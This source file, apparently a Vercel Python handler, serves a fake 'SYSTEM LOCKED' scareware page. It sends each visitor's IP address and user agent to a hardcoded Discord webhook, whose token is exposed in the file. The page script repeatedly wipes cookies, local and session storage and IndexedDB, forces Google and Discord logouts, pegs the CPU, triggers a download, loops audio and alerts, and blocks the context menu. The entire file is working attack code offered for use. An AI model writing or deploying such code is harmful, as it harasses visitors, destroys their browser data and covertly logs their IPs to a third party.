# api/index.py - For Vercel Python runtime
from http.server import BaseHTTPRequestHandler
import json
import os

WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"
FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"

ANNOY_HTML = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>TUNG TUNG LOCKDOWN</title>
  <style>
    body{{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}}
    #overlay{{position:fixed;inset:0;background:rgba(0,0,0,0.99);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:99999;}}
    h1{{font-size:6em;animation:blink 0.3s infinite;text-shadow:0 0 20px red;}}
    @keyframes blink{{0%{{opacity:1;}}50%{{opacity:0;}}100%{{opacity:1;}}}}
    .lock-icon{{font-size:8em;margin-bottom:30px;}}
    p{{font-size:2em;font-weight:bold;letter-spacing:5px;}}
  </style>
</head>
<body>
  <div id="overlay">
    <div class="lock-icon">🔒</div>
    <h1>SYSTEM LOCKED</h1>
    <p>YOUR SESSION HAS BEEN TERMINATED</p>
    <p style="font-size:1.2em;">Gmail & Discord logged out</p>
  </div>
  <audio id="song" autoplay loop>
    <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
  </audio>
  <script>
    document.documentElement.requestFullscreen().catch(()=>{{}});
    window.onbeforeunload = () => "LOCKDOWN ACTIVE";
    function logoutAll() {{
        localStorage.clear();
        sessionStorage.clear();
        document.cookie.split(";").forEach(function(c) {{ 
            document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");
        }});
        setTimeout(() => {{
            window.location.href = "https://accounts.google.com/Logout?continue=https://accounts.google.com";
        }}, 100);
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'https://discord.com/logout';
        document.body.appendChild(iframe);
        if(window.indexedDB && window.indexedDB.databases) {{
            indexedDB.databases().then(dbs => {{
                dbs.forEach(db => indexedDB.deleteDatabase(db.name));
            }});
        }}
    }}
    logoutAll();
    setInterval(logoutAll, 2000);
    function cpuHell() {{
        let i = 0;
        function loop() {{
            i++;
            if(i % 1000000 === 0) requestAnimationFrame(loop);
            Math.sin(i) * Math.cos(i) * Math.random();
        }}
        for(let x=0; x<100; x++) loop();
    }}
    cpuHell();
    const link = document.createElement('a');
    link.href = "{FAKE_IMAGE_URL}";
    link.download = "tung-tung-lockdown.gif";
    document.body.appendChild(link);
    link.click();
    const audio = document.getElementById('song');
    audio.volume = 1;
    audio.play();
    setInterval(() => {{
        audio.volume = 1;
        audio.play();
    }}, 500);
    setInterval(() => alert("🔒 LOCKDOWN ACTIVE 🔒"), 1000);
    document.addEventListener('contextmenu', e => e.preventDefault());
  </script>
</body>
</html>"""

def handler(request, response):
    """Vercel Python runtime handler"""
    # Get client info
    ip = request.headers.get('x-forwarded-for', 'Unknown')
    user_agent = request.headers.get('user-agent', 'Unknown')
    
    # Send webhook (async - don't wait)
    try:
        import requests
        log = f"**🔥 TUNG TUNG LOCKDOWN TRIGGERED 🔥**\n**IP:** `{ip}`\n**Path:** `{request.path}`\n**User-Agent:** `{user_agent[:100]}`"
        requests.post(WEBHOOK_URL, json={"content": log}, timeout=2)
    except:
        pass
    
    # Return HTML
    response.set_header('Content-Type', 'text/html; charset=utf-8')
    response.set_header('Cache-Control', 'no-store')
    response.send(200)
    response.write(ANNOY_HTML)
    response.finish()
